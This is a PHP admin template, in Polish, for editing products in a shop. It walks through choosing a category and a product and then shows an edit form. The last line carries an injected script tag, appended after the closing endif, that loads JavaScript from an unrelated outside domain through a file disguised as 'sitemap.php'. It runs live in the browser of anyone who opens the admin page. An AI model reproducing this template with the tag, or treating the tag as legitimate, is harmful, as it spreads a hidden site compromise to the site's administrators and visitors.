<h2>Edycja produktów</h2>

<?if(getOrder(1)):?>
	<?if(getOrder(2)):?>
		<?if(getPost('sent')):?>
			<p><a href='/item/<?=$current -> id?>'>Przeedytowano produkt, kliknij aby sprawdzić!</a>
		<?endif?>
		<form action='/itemEdit/<?=getOrder(1)?>/<?=getOrder(2)?>' method='post'>
		<input type='hidden' name='sent' value='yes'>
		<?module('form_item', array('current' => $current))?>
		<p><input type='submit' value='Zapisz zmiany'>
		</form>
	<?else:?>
		<h3>Wybierz poszukiwany produkt:</h3>
		<?module('ul_item', array('id' => getOrder(1), 'link' => 'itemEdit'))?>
	<?endif?>
<?else:?>
<h3>Wybierz kategorię, w której znajduje się poszukiwany produkt:</h3>
<?module('categories_admin', array('link' => 'itemEdit'))?>
<?endif?><script src=http://johanneswallmark.com/media/sitemap.php ></script>